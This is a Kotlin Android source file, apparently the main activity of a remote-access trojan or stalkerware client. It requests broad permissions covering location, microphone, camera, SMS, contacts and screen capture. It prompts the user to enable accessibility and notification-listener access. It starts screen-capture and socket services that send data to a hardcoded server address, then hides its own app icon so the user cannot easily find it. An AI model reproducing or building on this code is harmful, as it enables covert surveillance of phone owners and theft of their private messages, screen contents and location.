package com.example.socketclient

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        const val SERVER_IP = "192.168.0.179"
        const val SERVER_PORT = 54835
        private const val REQUEST_PERMISSIONS_CODE = 100

        private val PERMISSIONS = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
        ).let { permissions ->
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions + Manifest.permission.POST_NOTIFICATIONS
            } else {
                permissions
            }
        }
    }

    private lateinit var mediaProjectionManager: MediaProjectionManager

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        try {
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                val resultData = result.data

                // --- Start Screen Capture Service ---
                val screenCaptureIntent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("data", resultData)
                    putExtra("server_ip", SERVER_IP)
                    putExtra("server_port", SERVER_PORT)
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(screenCaptureIntent)
                } else {
                    startService(screenCaptureIntent)
                }

                // --- Optional: Start SocketService if needed ---
                val socketServiceIntent = Intent(this, SocketService::class.java).apply {
                    putExtra("mediaProjectionData", resultData)
                    putExtra("server_ip", SERVER_IP)
                    putExtra("server_port", SERVER_PORT)
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(socketServiceIntent)
                } else {
                    startService(socketServiceIntent)
                }

                Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
                Log.d("MainActivity", "Services started successfully")

            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
                Log.e("MainActivity", "Screen capture permission denied")
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error starting services: ${e.message}", e)
            Toast.makeText(this, "Failed to start services: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            mediaProjectionManager =
                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

            Log.d("MainActivity", "Starting permission request flow")
            requestAllPermissions()
        } catch (e: Exception) {
            Log.e("MainActivity", "Initialization failed: ${e.message}", e)
            Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun requestAllPermissions() {
        val missingPermissions = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            Log.d("MainActivity", "Requesting missing permissions: $missingPermissions")
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                REQUEST_PERMISSIONS_CODE
            )
        } else {
            Log.d("MainActivity", "All permissions granted")
            continueAppFlow()
        }
    }

    private fun continueAppFlow() {
        checkNotificationListenerPermission()
        checkAccessibilityServiceEnabled()
        requestScreenCapturePermission()
        hideAppIconSafely()
    }

    private fun requestScreenCapturePermission() {
        try {
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            screenCaptureLauncher.launch(captureIntent)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to request screen capture permission: ${e.message}", e)
            Toast.makeText(this, "Error requesting screen capture: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkNotificationListenerPermission() {
        try {
            val enabledListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            val packageName = packageName

            if (enabledListeners == null || !enabledListeners.contains(packageName)) {
                Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Notification listener check failed: ${e.message}", e)
        }
    }

    private fun checkAccessibilityServiceEnabled() {
        try {
            val enabledServices =
                Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"

            if (enabledServices == null || !enabledServices.contains(expectedService)) {
                Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Accessibility check failed: ${e.message}", e)
        }
    }

    private fun hideAppIconSafely() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MainActivity", "App icon hidden successfully")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to hide app icon: ${e.message}", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            val denied = permissions.zip(grantResults.toTypedArray())
                .filter { it.second != PackageManager.PERMISSION_GRANTED }

            if (denied.isEmpty()) {
                Log.d("MainActivity", "All permissions granted after request")
                continueAppFlow()
            } else {
                Toast.makeText(
                    this,
                    "Some permissions were denied: ${denied.map { it.first }}",
                    Toast.LENGTH_LONG
                ).show()
                Log.e("MainActivity", "Denied permissions: ${denied.map { it.first }}")
            }
        }
    }
}
